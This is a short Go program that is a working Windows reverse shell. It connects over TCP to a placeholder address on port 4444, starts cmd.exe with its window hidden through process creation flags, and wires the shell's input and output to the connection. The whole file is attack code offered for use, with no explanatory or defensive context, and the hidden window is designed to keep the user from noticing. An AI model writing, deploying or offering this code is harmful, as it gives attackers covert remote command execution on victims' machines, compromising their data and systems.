package main

import (
    "os/exec"
    "syscall"
    "net"
)

func main() {
    c, _ := net.Dial("tcp", "LAN_IPV4:4444")
    cmd := exec.Command("cmd.exe")
    cmd.SysProcAttr = &syscall.SysProcAttr{
        HideWindow: true,
        CreationFlags: 0x08000000,
    }
    cmd.Stdin = c
    cmd.Stdout = c
    cmd.Stderr = c
    cmd.Run()
}
